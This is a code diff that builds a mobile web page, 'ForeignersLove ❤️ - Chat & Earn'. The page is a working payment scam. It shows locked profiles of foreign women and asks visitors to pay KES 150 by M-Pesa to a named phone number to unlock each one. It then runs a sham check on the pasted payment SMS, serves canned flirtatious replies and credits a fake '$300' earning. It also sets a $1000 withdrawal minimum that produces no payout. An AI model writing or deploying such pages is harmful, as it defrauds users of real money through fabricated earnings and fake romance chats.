@@ -1,12 +1,146 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="refresh" content="0; url=login.html">
-<title>ForeignersLove</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ForeignersLove ❤️ - Chat & Earn</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+body{background:#f5f5f5}
+.header{background:white;padding:12px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 10px rgba(0,0,0,.1);position:sticky;top:0;z-index:20}
+.wallet{background:#222;color:#2ecc71;padding:7px 12px;border-radius:20px;font-weight:bold;font-size:13px}
+.withdraw-btn{background:#2ecc71;color:white;padding:7px 12px;border-radius:20px;font-size:12px;font-weight:bold;border:none}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px 12px 90px 12px}
+.card{background:white;border-radius:15px;overflow:hidden;box-shadow:0 3px 10px rgba(0,0,0,.08);position:relative}
+.card img{width:100%;height:180px;object-fit:cover}
+.info{padding:8px}
+.name{font-weight:bold;font-size:13px}
+.status{font-size:11px;color:#ff416c;font-weight:bold}
+.lock{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.86);display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;text-align:center;padding:10px;z-index:2}
+.btn{margin-top:8px;background:#ff416c;color:white;padding:9px 16px;border-radius:20px;font-size:12px;font-weight:bold;border:none}
+.banner{background:linear-gradient(90deg,#ff416c,#ff9a44);color:white;padding:10px;text-align:center;font-weight:bold;font-size:12px}
+.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:100;padding:15px}
+.modal-box{background:white;width:100%;max-width:380px;border-radius:20px;padding:20px;text-align:center;max-height:92vh;overflow-y:auto}
+.input{width:100%;padding:12px;border:2px solid #eee;border-radius:10px;margin:10px 0;font-size:13px;min-height:90px}
+.verify{background:#2ecc71;color:white;padding:12px;border:none;border-radius:10px;width:100%;font-weight:bold;font-size:15px}
+.till{background:#f0fff4;border:2px dashed #2ecc71;padding:12px;border-radius:10px;margin:10px 0;font-size:13px}
+.timer{background:#fff3cd;border:1px solid #ff9a44;padding:8px;border-radius:10px;margin:8px 0;font-size:11px;font-weight:bold;color:#d35400}
+.chat{background:#f9f9f9;border-radius:15px;padding:10px;margin:10px 0;text-align:left;max-height:220px;overflow-y:auto}
+.msg{padding:8px 12px;border-radius:15px;margin:6px 0;font-size:13px;max-width:80%}
+.girl{background:white;box-shadow:0 1px 3px rgba(0,0,0,.1)}
+.you{background:#ff416c;color:white;margin-left:auto}
+.whatsapp{position:fixed;bottom:20px;right:15px;background:#25D366;color:white;width:55px;height:55px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;box-shadow:0 4px 15px rgba(0,0,0,.3);z-index:90;text-decoration:none}
+.footer{background:white;padding:15px;text-align:center;font-size:11px;color:#777;border-top:1px solid #eee}
+.footer b{color:#ff416c;text-decoration:underline;cursor:pointer}
+</style>
 </head>
 <body>
-<p>Redirecting to <a href="login.html">login</a>...</p>
-<script>window.location='login.html'</script>
+<div class="header"><b>ForeignersLove ❤️</b><div style="display:flex;gap:6px;align-items:center"><div class="wallet" id="wallet">💰 $0</div><button class="withdraw-btn" onclick="openModal('withdrawModal')">Withdraw</button></div></div>
+<div class="banner">🔒 Touch Any Girl → Pay KES 150 to 0706900843 → Paste SMS (Valid 5 MINS) → Earn $300!</div>
+<div class="grid" id="grid"></div>
+<div class="footer"><b onclick="openModal('termsModal')">Terms</b> | <b onclick="openModal('privacyModal')">Privacy</b> | 18+ Only<br><br>© 2026 ForeignersLove - Entertainment<br>Support: 0706900843<br><button onclick="localStorage.clear();location.reload()" style="border:none;background:none;color:#bbb;font-size:10px;margin-top:6px;text-decoration:underline">Reset Demo</button></div>
+<a href="https://wa.me/254706900843?text=Hi%20I%20paid%20150%20to%200706900843" target="_blank" class="whatsapp">💬</a>
+
+<div class="modal" id="ageModal" style="display:flex;z-index:200"><div class="modal-box" style="border:2px solid #ff416c"><h2 style="color:#ff416c">🔞 18+ Verification</h2><p style="font-size:13px;margin:12px 0;text-align:left">✅ I am 18+<br>✅ Entertainment only<br>✅ Pay KES 150 per unlock to 0706900843 JULIUS<br>✅ SMS valid 5 MINS only</p><button onclick="localStorage.setItem('fl_age','yes');document.getElementById('ageModal').style.display='none'" style="background:#ff416c;color:white;padding:12px;border:none;border-radius:10px;width:100%;font-weight:bold">✅ I am 18+ - Enter</button><button onclick="location.href='https://google.com'" style="background:#eee;color:#555;padding:10px;border:none;border-radius:10px;width:100%;font-weight:bold;margin-top:8px">❌ Under 18 - Exit</button></div></div>
+
+<div class="modal" id="termsModal"><div class="modal-box" style="text-align:left"><h3 style="color:#ff416c;text-align:center">📜 Terms</h3><div style="font-size:11px;margin-top:10px;line-height:1.6"><b>1. Age 18+</b> only.<br><b>2. Payment KES 150</b> to 0706900843 JULIUS - Send Money, non-refundable.<br><b>3. SMS</b> must be within 5 MINUTES.<br><b>4. Earnings $300</b> after 5 msgs, min withdraw $1000.<br><b>5. Entertainment only.</b></div><button onclick="closeModal('termsModal')" style="background:#222;color:white;padding:10px;border:none;border-radius:10px;width:100%;margin-top:12px">I Agree</button></div></div>
+<div class="modal" id="privacyModal"><div class="modal-box"><h3>🔒 Privacy</h3><p style="font-size:11px;margin-top:8px">SMS checked only for 150, Julius, time. Not stored.</p><button onclick="closeModal('privacyModal')" style="background:#222;color:white;padding:10px;border:none;border-radius:10px;width:100%;margin-top:10px">Close</button></div></div>
+
+<div class="modal" id="payModal"><div class="modal-box"><h3 id="modalTitle" style="color:#ff416c">Unlock</h3><div class="till"><b>SEND KES 150 TO:</b><br><span style="font-size:26px;font-weight:bold">0706900843</span><br>Name: <b>JULIUS</b><br><span style="font-size:11px;background:#222;color:white;padding:3px 10px;border-radius:10px">M-Pesa Send Money</span></div><div class="timer">⏰ SMS must be from LAST 5 MINUTES! Old SMS = REJECTED</div><textarea class="input" id="mpesaCode" placeholder="Paste RECENT M-Pesa SMS here..."></textarea><button class="verify" onclick="verifyPayment()">✅ Verify (5 Min Check)</button><button onclick="closeModal('payModal')" style="background:none;border:none;color:#777;margin-top:8px">Cancel</button><p id="errorMsg" style="font-size:11px;display:none;margin-top:8px;padding:8px;border-radius:8px"></p></div></div>
+
+<div class="modal" id="chatModal"><div class="modal-box"><h3 id="chatName" style="color:#ff416c">Chat</h3><div style="font-size:11px;color:#2ecc71">● Online - Earn $300 after 5 msgs</div><div class="chat" id="chatBox"></div><div style="display:flex;gap:6px;margin-top:10px"><input id="chatInput" placeholder="Type..." style="flex:1;padding:10px;border-radius:20px;border:1px solid #ddd" onkeypress="if(event.key==='Enter')sendMsg()"><button onclick="sendMsg()" style="background:#ff416c;color:white;border:none;padding:10px 15px;border-radius:20px;font-weight:bold">Send</button></div><div style="background:#fff3cd;padding:8px;border-radius:10px;margin-top:10px;font-size:11px">💰 Progress: <span id="msgCount">0/5</span> to earn $300</div><button id="earnBtn" onclick="claimEarning()" style="display:none;background:#2ecc71;color:white;padding:12px;border:none;border-radius:10px;width:100%;font-weight:bold;margin-top:10px">🎉 Claim $300</button><button onclick="closeModal('chatModal')" style="background:none;border:none;color:#777;margin-top:8px">Close</button></div></div>
+
+<div class="modal" id="withdrawModal"><div class="modal-box"><h3 style="color:#2ecc71">💸 Withdraw</h3><div style="background:#f0fff4;padding:12px;border-radius:10px;margin:10px 0"><div style="font-size:28px;font-weight:bold;color:#2ecc71" id="withdrawBalance">$0</div></div><div id="withdrawForm"><p style="font-size:12px"><span id="withdrawInfo"></span></p><input id="mpesaNumber" placeholder="Your M-Pesa 07xx..." style="width:100%;padding:12px;border:2px solid #eee;border-radius:10px;margin:8px 0"><button onclick="doWithdraw()" style="background:#2ecc71;color:white;padding:12px;border:none;border-radius:10px;width:100%;font-weight:bold">Request Withdrawal</button></div><div id="withdrawSuccess" style="display:none"><p style="color:#2ecc71;font-weight:bold">✅ Request Sent!</p><p style="font-size:12px">Your <span id="withdrawAmount"></span> to <span id="withdrawTo"></span> in 24hrs</p></div><button onclick="closeModal('withdrawModal')" style="background:none;border:none;color:#777;margin-top:10px">Close</button></div></div>
+
+<div class="modal" id="successModal"><div class="modal-box"><h3 style="color:#2ecc71">🎉 $300 Earned!</h3><p id="successText"></p><div style="font-size:36px;font-weight:bold;color:#2ecc71;margin:10px 0">+$300</div><button onclick="closeModal('successModal')" style="background:#2ecc71;color:white;padding:12px;border:none;border-radius:10px;width:100%;font-weight:bold">Continue</button></div></div>
+
+<script>
+const APP_VERSION='v7-all-locked';
+if(localStorage.getItem('fl_version')!==APP_VERSION){
+  localStorage.setItem('fl_balance','0');
+  localStorage.setItem('fl_unlocked','[]');
+  localStorage.setItem('fl_earned','[]');
+  localStorage.setItem('fl_version',APP_VERSION);
+}
+let balance=parseInt(localStorage.getItem('fl_balance')||'0');
+let unlocked=JSON.parse(localStorage.getItem('fl_unlocked')||'[]');
+let earned=JSON.parse(localStorage.getItem('fl_earned')||'[]');
+let currentIdx=null,currentName='',chatMsgs=0;
+if(localStorage.getItem('fl_age')==='yes')document.getElementById('ageModal').style.display='none';
+function openModal(id){document.getElementById(id).style.display='flex';}
+function closeModal(id){document.getElementById(id).style.display='none';}
+function updateWallet(){document.getElementById('wallet').innerText='💰 $'+balance; if(document.getElementById('withdrawBalance')) document.getElementById('withdrawBalance').innerText='$'+balance+'.00';}
+updateWallet();
+const girls=[
+{n:'Sofia',a:22,o:'USA',i:'https://randomuser.me/api/portraits/women/1.jpg'},
+{n:'Emma',a:24,o:'UK',i:'https://randomuser.me/api/portraits/women/2.jpg'},
+{n:'Isabella',a:23,o:'Germany',i:'https://randomuser.me/api/portraits/women/3.jpg'},
+{n:'Mia',a:21,o:'Canada',i:'https://randomuser.me/api/portraits/women/4.jpg'},
+{n:'Charlotte',a:25,o:'Australia',i:'https://randomuser.me/api/portraits/women/5.jpg'},
+{n:'Amelia',a:22,o:'Italy',i:'https://randomuser.me/api/portraits/women/6.jpg'},
+{n:'Harper',a:24,o:'France',i:'https://randomuser.me/api/portraits/women/7.jpg'},
+{n:'Ava',a:23,o:'USA',i:'https://randomuser.me/api/portraits/women/8.jpg'},
+{n:'Luna',a:21,o:'Spain',i:'https://randomuser.me/api/portraits/women/9.jpg'},
+{n:'Grace',a:26,o:'UK',i:'https://randomuser.me/api/portraits/women/10.jpg'},
+{n:'Chloe',a:22,o:'USA',i:'https://randomuser.me/api/portraits/women/11.jpg'},
+{n:'Zoe',a:23,o:'Canada',i:'https://randomuser.me/api/portraits/women/12.jpg'},
+{n:'Lily',a:24,o:'Sweden',i:'https://randomuser.me/api/portraits/women/13.jpg'},
+{n:'Hannah',a:22,o:'Norway',i:'https://randomuser.me/api/portraits/women/14.jpg'},
+{n:'Abigail',a:25,o:'USA',i:'https://randomuser.me/api/portraits/women/15.jpg'},
+{n:'Emily',a:21,o:'UK',i:'https://randomuser.me/api/portraits/women/16.jpg'},
+{n:'Elizabeth',a:24,o:'Germany',i:'https://randomuser.me/api/portraits/women/17.jpg'},
+{n:'Mila',a:23,o:'France',i:'https://randomuser.me/api/portraits/women/18.jpg'},
+{n:'Ella',a:22,o:'USA',i:'https://randomuser.me/api/portraits/women/19.jpg'},
+{n:'Aria',a:24,o:'Australia',i:'https://randomuser.me/api/portraits/women/20.jpg'},
+];
+function render(){
+let html='';
+girls.forEach((g,idx)=>{
+let isUnlocked=unlocked.includes(idx);
+if(isUnlocked){
+html+=`<div class="card" onclick="openChat(${idx},'${g.n}')"><img src="${g.i}"><div class="info"><div class="name">${g.n}, ${g.a}</div><div class="status" style="color:#2ecc71">● Online - Chat Now</div></div><button class="btn" style="background:#2ecc71;position:absolute;top:8px;right:8px;font-size:10px;padding:5px 10px">Chat Now</button></div>`;
+}else{
+html+=`<div class="card" onclick="openPay(${idx},'${g.n}')"><img src="${g.i}"><div class="info"><div class="name">${g.n}, ${g.a}</div><div class="status">🔒 Locked - Pay 150</div></div><div class="lock"><span style="font-size:30px">🔒</span><div style="font-weight:bold;margin:5px 0">${g.n} LOCKED</div><div style="font-size:11px">Pay KES 150 to<br>0706900843 (JULIUS)<br>Valid 5 MINS only</div><button class="btn" onclick="event.stopPropagation();openPay(${idx},'${g.n}')">🔓 Unlock - KES 150</button></div></div>`;
+}
+});
+document.getElementById('grid').innerHTML=html;
+}
+render();
+function openPay(idx,name){currentIdx=idx;currentName=name;document.getElementById('modalTitle').innerText='Unlock '+name+' - KES 150';document.getElementById('mpesaCode').value='';document.getElementById('errorMsg').style.display='none';openModal('payModal');}
+function verifyPayment(){
+let code=document.getElementById('mpesaCode').value.trim();
+let err=document.getElementById('errorMsg');err.style.display='block';
+if(code.length<20){err.style.background='#ffeaea';err.style.color='red';err.innerText='❌ Paste FULL M-Pesa SMS';return;}
+let lower=code.toLowerCase();
+if(!lower.includes('150')){err.style.background='#ffeaea';err.style.color='red';err.innerText='❌ Amount must be KES 150';return;}
+if(!lower.includes('julius') && !lower.includes('0706900843') && !lower.includes('706900843')){err.style.background='#ffeaea';err.style.color='red';err.innerText='❌ Must be to 0706900843 JULIUS';return;}
+let t=check5Min(code);
+if(!t.valid){err.style.background='#ffeaea';err.style.color='red';err.innerText='❌ '+t.reason+' Send again to 0706900843';return;}
+err.style.background='#e0ffe0';err.style.color='#2ecc71';err.innerText='✅ Verified! Unlocking...';
+setTimeout(()=>{if(!unlocked.includes(currentIdx)){unlocked.push(currentIdx);localStorage.setItem('fl_unlocked',JSON.stringify(unlocked));}render();closeModal('payModal');setTimeout(()=>openChat(currentIdx,currentName),400);},800);
+}
+function check5Min(code){
+try{
+let now=new Date();
+let m=code.match(/at\s+(\d{1,2}):(\d{2})\s*(AM|PM|am|pm)?/);
+if(!m)return {valid:false,reason:'Could not read time. Need at 2:23 PM'};
+let h=parseInt(m[1]);let min=parseInt(m[2]);let ap=m[3];
+if(ap){ap=ap.toUpperCase();if(ap==='PM'&&h<12)h+=12;if(ap==='AM'&&h===12)h=0;}
+let d=new Date();let dm=code.match(/on\s+(\d{1,2})\/(\d{2,4})/);
+if(dm){let day=parseInt(dm[1]);let mo=parseInt(dm[2])-1;let yr=parseInt(dm[3]);if(yr<100)yr+=2000;d=new Date(yr,mo,day,h,min);}else{d.setHours(h,min,0,0);}
+let diff=(now-d)/60000;
+if(diff<-2)return {valid:false,reason:'Time in future'};
+if(diff>5)return {valid:false,reason:'SMS '+Math.floor(diff)+' mins old! Expired.'};
+return {valid:true};
+}catch(e){return {valid:false,reason:'Could not verify time'};}
+}
+function openChat(idx,name){currentIdx=idx;currentName=name;chatMsgs=0;document.getElementById('chatName').innerText='Chat with '+name;document.getElementById('chatBox').innerHTML=`<div class="msg girl">Hi I'm ${name} 😘 from ${girls[idx].o}! Thanks for unlocking me! How are you? 💕</div>`;document.getElementById('msgCount').innerText='0/5';document.getElementById('earnBtn').style.display='none';openModal('chatModal');}
+function sendMsg(){let inp=document.getElementById('chatInput');let txt=inp.value.trim();if(!txt)return;document.getElementById('chatBox').innerHTML+=`<div class="msg you">${txt}</div>`;inp.value='';chatMsgs++;document.getElementById('msgCount').innerText=chatMsgs+'/5';setTimeout(()=>{let r=["Aww sweet 🥰","I like you! 😘","Kenyan men nice ❤️","Meet someday? 😉","You make me smile! 💕"];document.getElementById('chatBox').innerHTML+=`<div class="msg girl">${r[Math.min(chatMsgs-1,4)]}</div>`;document.getElementById('chatBox').scrollTop=9999;if(chatMsgs>=5&&!earned.includes(currentIdx))document.getElementById('earnBtn').style.display='block';},600);document.getElementById('chatBox').scrollTop=9999;}
+function claimEarning(){if(earned.includes(currentIdx))return;earned.push(currentIdx);balance+=300;localStorage.setItem('fl_earned',JSON.stringify(earned));localStorage.setItem('fl_balance',balance.toString());updateWallet();closeModal('chatModal');document.getElementById('successText').innerText='You chatted with '+currentName+' and earned $300!';openModal('successModal');render();}
+function doWithdraw(){let num=document.getElementById('mpesaNumber').value.trim();if(num.length<10){alert('Enter valid M-Pesa');return;}if(balance<1000){alert('Min $1000. You have $'+balance);return;}document.getElementById('withdrawAmount').innerText='$'+balance;document.getElementById('withdrawTo').innerText=num;document.getElementById('withdrawForm').style.display='none';document.getElementById('withdrawSuccess').style.display='block';}
+document.getElementById('mpesaNumber')?.addEventListener('input',()=>{});
+function openWithdraw(){updateWallet();document.getElementById('withdrawInfo').innerText=balance<1000?'Need $'+(1000-balance)+' more! Chat '+(Math.ceil((1000-balance)/300))+' more':'Ready to withdraw $'+balance;document.getElementById('withdrawForm').style.display='block';document.getElementById('withdrawSuccess').style.display='none';openModal('withdrawModal');}
+</script>
 </body>
 </html>
+
